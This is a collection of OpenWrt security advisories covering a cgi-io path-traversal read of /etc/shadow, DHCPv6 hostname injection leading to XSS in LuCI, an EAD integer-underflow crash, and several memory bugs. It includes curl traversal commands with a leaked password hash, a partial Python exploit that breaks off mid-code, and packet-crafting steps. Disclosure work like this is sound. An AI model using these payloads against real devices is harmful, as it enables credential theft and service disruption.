advisories.summary: ACL bypass and arbitrary root file read via cgi-io cgi-download
advisories.description:
## Summary

The `cgi-download` handler in cgi-io authorizes the requested `path` against the caller's ubus session `file` ACL and then opens it without canonicalizing the path first (`main.c:540`, `main.c:557`). rpcd's ACL matcher uses `fnmatch()` without `FNM_PATHNAME` (`session.c:146`), so a wildcard in an allowed ACL glob spans `/`. A request path of the form `<allowed-glob-prefix>/../../../<target>` matches the literal allowed prefix during the ACL check, while the subsequent `open()` lets the kernel resolve the embedded `..` and reach a file outside that prefix. cgi-io runs as root, so the resolved target is any file readable by uid 0. The sibling upload handler and rpcd-mod-file both canonicalize before their ACL check and reject the same input.

Result: a session holding the `cgi-io download` permission and any wildcard `file` read grant reads any root-readable file, including `/etc/shadow`, which the rpcd file API denies to that same session.

## Affected

OpenWrt cgi-io, git HEAD `658b14b`, as shipped in OpenWrt 25.12.4 (r32933-4ccb782af7). `/www/cgi-bin/cgi-download` is a symlink to `/usr/libexec/cgi-io`.
Requires an authenticated ubus session holding `cgi-io download` (access group `luci-mod-system-flash`) plus one wildcard `file` read grant: `luci-mod-system-repokeys` (`/etc/apk/keys/*`), `luci-mod-network-config` (`/proc/sys/net/ipv[46]/conf/*`), or `luci-mod-system-flash` itself (`/dev/mtdblock[0-9]*`).
On a default single-root install the root LuCI session holds these grants. Deployments that delegate a restricted rpcd `config login` operator the flash access group are affected at a lower privilege tier.
Unauthenticated requests are rejected at `main.c:537`; the read is not anonymously reachable.

## Root cause

`main_download` reads the `path` POST field and passes it unmodified to `session_access(sid, "file", fields[3], "read")` (`main.c:540`) and then to `open(fields[3], O_RDONLY)` (`main.c:557`). rpcd evaluates the ACL with `fnmatch(acl->object, path, FNM_NOESCAPE)` (`session.c:146`), and the missing `FNM_PATHNAME` lets a `*` in an allowed glob match `/` and therefore an entire `../` traversal suffix. Because the ACL string and the `open()` string are the same raw bytes, the check passes against the allowed prefix while the kernel resolves the `..` to a file outside it. The upload handler canonicalizes with `canonicalize_path()` before its ACL check (`main.c:372`, `main.c:348`), and rpcd-mod-file canonicalizes at `file.c:264` before `rpc_file_access` at `file.c:272`, so both reject the identical traversal. cgi-io runs as root, so the missing canonicalization on the download path turns a path-scoped read grant into a read of any uid-0-readable file.

## Reproduction

`openwrt/rootfs:x86_64-25.12.4` in Docker running uhttpd, ubusd, rpcd, rpcd-mod-file and LuCI, with a root password set and stock ACLs. The session below is a restricted operator holding only `luci-mod-system-flash` and `luci-mod-system-repokeys`.

1. Confirm the boundary: the rpcd file API denies a direct read of `/etc/shadow` to this session.

```
curl -s http://target/ubus -d '{"jsonrpc":"2.0","id":1,"method":"call","params":["<SID>","file","read",{"path":"/etc/shadow"}]}'
{"jsonrpc":"2.0","id":1,"result":[6]}        # 6 = UBUS_STATUS_PERMISSION_DENIED
```

2. Request the same file through `cgi-download` with a traversal anchored on the allowed `/etc/apk/keys/*` glob.

```
curl -s http://target/cgi-bin/cgi-download \
  --data-urlencode sessionid=<SID> \
  --data-urlencode 'path=/etc/apk/keys/../../../../etc/shadow' \
  --data-urlencode filename=shadow

root:$5$mvVDXOUP7en9BitX$Gkz1aD7xpioPLekqUZFkYNOvLuQ44n7QAK/c/dFnqG5:20631:0:99999:7:::
daemon:*:0:0:99999:7:::
```

Live-verified: the response body is byte-identical (SHA-256 match) to `/etc/shadow` on disk, including the root password hash, returned to a session that the rpcd file API denies the same read.

## Impact

- Disclosure of the `/etc/shadow` root password hash, crackable offline to a root login.
- Disclosure of `/etc/config/*` secrets: Wi-Fi PSKs, WireGuard and OpenVPN private keys, PPPoE credentials.
- Disclosure of `/etc/dropbear/*` SSH host keys and `/etc/uhttpd.key` TLS private key.
- Read of any uid-0-readable file, including `/proc/<pid>/environ` and `/proc/<pid>/cmdline`.

## Credit

Jan Kahmen, [turingpoint](https://www.turingpoint.de) (jan@turingpoint.de)

advisories.summary: odhcpd/LuCI: unauthenticated DHCPv6 client can inject lease-file lines via FQDN hostname → stored XSS in the LuCI admin UI
advisories.description: ## Summary `odhcpd` writes a DHCPv6 client's requested hostname (its FQDN option, opt 39) into the lease state file `/tmp/odhcpd.leases` via `fprintf("…%s…", lease->hostname)` with **no escaping**. The hostname is decoded by `dn_expand()`, which copies DNS-label bytes **verbatim** — including `0x0a` (newline). A single newline **injects an arbitrary additional line** into the lease file. That file is parsed by LuCI's `rpcd-mod-luci` `getDHCPLeases` (`fgets`+`strtok`, lines beginning `# `) and shown in the **"Active DHCPv6 Leases"** admin status page. LuCI renders the host cell through `dom.append` → `node.innerHTML` **without HTML-escaping**, so an attacker-controlled hostname becomes **live markup in the privileged admin DOM** — an unauthenticated, pre-association **stored XSS** in the device management UI. One unauthenticated DHCPv6 REQUEST forges a lease record: ```jsonc // what getDHCPLeases returns after the injection (the forged record): { "interface": "br-lan", "hostname": "` does **not** — the `/` mid-value is part of the value, not an attribute separator.) ## Proof-of-concept (embedded) ### 1) `exploit_D_001_fqdn_inject.py` — the injection PoC (raw DHCPv6, stdlib only) ```python #!/usr/bin/env python3 # VIPRE Ranger PoC for D-001 (odhcpd DHCPv6 FQDN hostname -> leasefile line injection -> LuCI XSS). # A DHCPv6 client's OPTION_CLIENT_FQDN (opt 39) hostname is decoded with dn_expand (musl copies # label bytes VERBATIM) and written UNESCAPED via fprintf into /tmp/odhcpd.leases (statefiles.c:498). # A 0x0a in the label injects a whole extra '#'-prefixed line -> a forged lease record that LuCI # rpcd-mod-luci getDHCPLeases parses and renders in the privileged admin "Active DHCP6 Leases" view. # Wire: SOLICIT -> ADVERTISE -> REQUEST -> REPLY (FQDN rides SOLICIT and REQUEST). # SAFETY: target ONLY an isolated lab. No root needed (falls back to an ephemeral UDP src port). import argparse, os, random, socket, struct, sys DHCPV6_SERVER_PORT, DHCPV6_CLIENT_PORT = 547, 546 MSG_SOLICIT, MSG_ADVERTISE, MSG_REQUEST, MSG_REPLY = 1, 2, 3, 7 OPT_CLIENTID, OPT_SERVERID, OPT_IA_NA, OPT_IAADDR, OPT_ORO, OPT_ELAPSED, OPT_FQDN = 1, 2, 3, 5, 6, 8, 39 def opt(code, data): return struct.pack("!HH", code, len(data)) + data def build_clientid(): mac = bytes([0x02, 0x00, 0x00, 0xde, 0xad, 0xbe]) # DUID-LL (type 3), ether return opt(OPT_CLIENTID, struct.pack("!HH", 3, 1) + mac) def build_ia_na(iaid): return opt(OPT_IA_NA, struct.pack("!III", iaid, 0, 0)) def build_fqdn_option(label_bytes): # OPTION_CLIENT_FQDN(39) = flags(1) + DNS name

advisories.summary: EAD Integer Underflow → Pre-Auth Denial of Service
advisories.description:
### Summary

An integer underflow in `handle_send_a()` of the Emergency Access Daemon (EAD) allows any
unauthenticated attacker on the local network to crash the daemon by sending a single crafted
UDP packet. No credentials are required — only a valid username (e.g. `root`) present in
`/etc/passwd`.

---

### Details

In `handle_send_a()` (lines 426–447 of `ead.c`), the message length is computed as:

```c
// len is declared as int
len = ntohl(msg->len) - sizeof(struct ead_msg_number);
```

`sizeof(struct ead_msg_number)` is `1` (one `uint8_t` field + flexible array).  
The subtraction is performed in **unsigned arithmetic** (C usual arithmetic conversions):
if `msg->len == 0`, then `0u - 1u = 0xFFFFFFFF`.  
This value is then assigned to the `int len`, yielding `-1` on every two's-complement
architecture (ARM, MIPS, x86, RISC-V — the full set of OpenWrt targets).

The bounds check that follows is:

```c
if (len > MAXPARAMLEN + 1)   // -1 > 257 → FALSE → check bypassed
    return false;
```

`memcpy` is then called with `len` implicitly cast to `size_t`, producing `SIZE_MAX`:

```c
A.len  = len;       // -1
A.data = abuf;
memcpy(A.data, number->data, len);  // memcpy(..., SIZE_MAX) → crash
```

**Why the packet passes all prior validation:**

The dispatcher in `parse_message()` only checks that the *captured packet length* is
`≥ sizeof(struct ead_packet) + 1`. It does **not** validate `msg->len`.  
`handle_packet()` (line 670) additionally requires:

```c
if (h->len < sizeof(struct ead_packet) + ntohl(pkt->msg.len))
    return;
```

When `msg->len == 0`, this reduces to `h->len >= sizeof(struct ead_packet)`.  
A packet with `h->len = sizeof(struct ead_packet) + 1` and `msg->len = 0` therefore
**passes every check** and reaches the vulnerable `memcpy`.

---

### Proof of Concept

**Prerequisites:** attacker on the same Layer-2/3 segment as the EAD daemon (UDP/56026).

**Step 1 — Establish session with a valid username:**
```
# EAD_TYPE_SET_USERNAME  →  username = "root"
# EAD_TYPE_GET_PRIME     →  retrieve SRP prime (no auth required)
```

**Step 2 — Send the malformed EAD_TYPE_SEND_A packet:**
```
h->len   = sizeof(struct ead_packet) + 1   # passes handle_packet() check
msg->len = 0x00000000                      # triggers underflow in handle_send_a()
```

**Result:** `memcpy(abuf, number->data, SIZE_MAX)` is invoked, causing an immediate
out-of-bounds read and daemon crash (SIGSEGV / SIGBUS).

**No password knowledge is required.**

---

### Impact

- **Type:** Denial of Service (daemon crash)
- **Vector:** Adjacent Network, no authentication required
- **Who is impacted:** Any OpenWrt device with EAD enabled and reachable on UDP/56026.
  EAD is used as an emergency remote-access mechanism; crashing it eliminates the
  emergency recovery capability and may be a precursor to a broader attack.
- **Potential escalation:** The same `len = -1` path passes a `size_t`-cast to `memcpy`;
  on 32-bit targets where `SIZE_MAX == 0xFFFFFFFF` the read wraps the process address
  space and could, under specific heap/BSS layouts, be leveraged beyond a simple crash.

---

### Suggested Fix

```c
// Validate BEFORE the subtraction to avoid underflow
uint32_t msg_len = ntohl(msg->len);
if (msg_len < sizeof(struct ead_msg_number))
    return false;

int len = (int)(msg_len - sizeof(struct ead_msg_number));
if (len > MAXPARAMLEN + 1)
    return false;
```

advisories.summary: procd: Command execution via PATH environment variable filter bypass
advisories.description:
procd executes scripts located in /etc/hotplug.d when certain events happen on a
system, and can be invoked via the call ubus method. The hotplug_call function is
responsible for handling these invocations and will perform environment variable filtering
and processing during execution. One of the environment variables that is filtered out is
the PATH variable, but because of the use of strcmp rather than strncmp, the variable is
not excluded. Instead of comparing the first four characters of the environment variable to
PATH, the full string is compared, and the variable is therefore not skipped. As such, it may
be possible to specify an arbitrary PATH variable in order to perform privilege escalation.

### References
Fix: http://github.com/openwrt/procd/commit/e08cdc8562f55b9ac228a21f3f7605a18c522b81

advisories.summary: jsonpath: Memory leak when processing strings, labels, and regexp tokens
advisories.description:
The jp_get_token function is part of the lexical analysis phase, which breaks input
expressions into individual tokens for subsequent parsing. During tokenization, the library
extracts and stores string literals, field labels, and regular expressions, which involves
dynamic memory allocation to handle variable-length text content. The extraction results
are stored in the jp_opcode struct, which is later transferred to a new jp_opcode object
in the jp_alloc_op function. If a string was previously extracted to an initial jp_opcode
object, the string will be copied to the new allocation, without freeing the previous one,
leading to a memory leak.

advisories.summary: mdnsd: Stack buffer overflow in IPv6 reverse DNS lookup
advisories.description:
The mdns daemon contains a stack buffer overflow vulnerability in the
match_ipv6_addresses function when processing PTR queries for IPv6 reverse DNS
domains (.ip6.arpa). The vulnerability is reachable through normal DNS packet
processing when the daemon receives multicast DNS queries on UDP port 5353.
The global buffer name_buffer, which holds the expanded domain after the call to
dns_consume_name, is processed in the parse_question function, where different DNS
query types are handled. For TYPE_PTR queries, dns_consume_name checks if
name_buffer ends with a reverse DNS suffix. If a match is found, the strcpy operation is
performed from name_buffer into a fixed 256-byte stack buffer with the IPv6 reverse DNS
suffix being excluded. The resultant buffer is then processed by
dns_reply_reverse_ip6_mapping, which calls match_ipv6_addresses.
In the match_ipv6_addresses function, the reverse IPv6 request is extracted into a
buffer of length INET6_ADDRSTRLEN (46). Since the length of the data in the 256-byte
buffer is not checked before extracting the IPv6 address, it is possible for the data to be
larger than 46 bytes, leading to an out-of-bounds (OOB) write

advisories.summary: mdnsd: Stack buffer overflow in DNS PTR query
advisories.description:
The mdns daemon contains a stack buffer overflow vulnerability in the parse_question
function when processing PTR queries for reverse DNS domains (.in-addr.arpa and
.ip6.arpa). The vulnerability is reachable through normal DNS packet processing when
the daemon receives multicast DNS queries on UDP port 5353.
DNS packets are first processed by dns_handle_packet, which validates and processes
the packets in dns_consume_name. This function calls dn_expand to expand the queried
domain into the fixed-sized global buffer, name_buffer, which holds 8096 bytes
(MAX_NAME_LEN).
The same global buffer is then processed in the parse_question function, where
different types of DNS queries are handled. For TYPE_PTR queries, the function checks if
name_buffer ends with a reverse DNS suffix. When a match is found, it performs an
unbounded strcpy from the potentially large expanded name in name_buffer into fixed
256-byte stack buffers.
The issue is that when dn_expand encounters non-printable ASCII bytes (0x01, 0x02, …), it
will convert the bytes to their octal representations. For example, the byte 0x01 would be
converted to its octal counterpart, \001, which is 0x5C 0x30 0x30 0x31.
As such, it is possible to forge a maliciously crafted DNS packet such that when it is
expanded, it is much greater than the intended 256-byte stack buffer.

### Impact
ubusd contains a heap buffer overflow in the event registration parsing code. This allows an attacker to modify the head and potentially execute arbitrary code in the context of the ubus daemon.
The affected code is executed before running the ACL checks, all ubus clients are able to send such messages.
In addition to the heap corruption, the crafted subscription also results in a bypass of the listen ACL.

### Patches
This is fixed in OpenWrt 24.10.4 and later, including snapshots builds since October 18th 2025.
Older OpenWrt versions like 23.05 and 22.03 might be affected too, but they are end of life and do not receive any security support any more. 

### Workarounds
No

### References
ubus fix: https://github.com/openwrt/ubus/commit/d31effb4277bd557f5ccf16d909422718c1e49d0
fix similar code pattern: https://github.com/openwrt/ubus/commit/aa4a7ee1d3417bc11207ad0a78d579ece7fe0c13
fix ACL bypass: https://github.com/openwrt/ubus/commit/60e04048a0e2f3e33651c19e62861b41be4c290f

OpenWrt main branch: https://github.com/openwrt/openwrt/commit/4b907e69ea58fc0ba35fd1755dc4ba22262af3a4
OpenWrt 24.10: https://github.com/openwrt/openwrt/commit/a7901969932a175cded3c93bdeb65f32ed3705e6

OpenWrt security advisory: https://openwrt.org/advisory/2025-10-22-1

### Credit
Thank you Karsten Sperling from Apple for the report and the PoC.

### Impact
Local users could read and write arbitrary kernel memory using the ioctls of the ltq-ptm driver which is used to drive the datapath of the DSL line.
This only effects the lantiq target supporting xrx200, danube and amazon SoCs from Lantiq/Intel/MaxLinear with the DSL in PTM mode. The DSL driver for the VRX518 is not affected. ATM mode is also not affected. Most VDSL lines use PTM mode and most ADSL lines use ATM mode.

OpenWrt is normally running as a single user system, but some services are sandboxed. This vulnerability could allow attackers to escape a ujail sandbox or other contains.

### Patches
This is fixed in OpenWrt 24.10.4 and later, including snapshots builds since October 15th 2025.
Older OpenWrt versions like 23.05 and 22.03 might be affected too, but they are end of life and do not receive any security support any more. 


### Workarounds
No

### References
Fix main branch: https://github.com/openwrt/openwrt/commit/2a76abc5442e3f74d95b4caa9bb57e5488fc132e
Fix OpenWrt 24.10: https://github.com/openwrt/openwrt/commit/e001b31163a77683ee741d169f794cfa50926f37

OpenWrt security advisory: https://openwrt.org/advisory/2025-10-22-2

### Credit
Thank you Stanislav Fort from Aisle Research for reporting this to us.
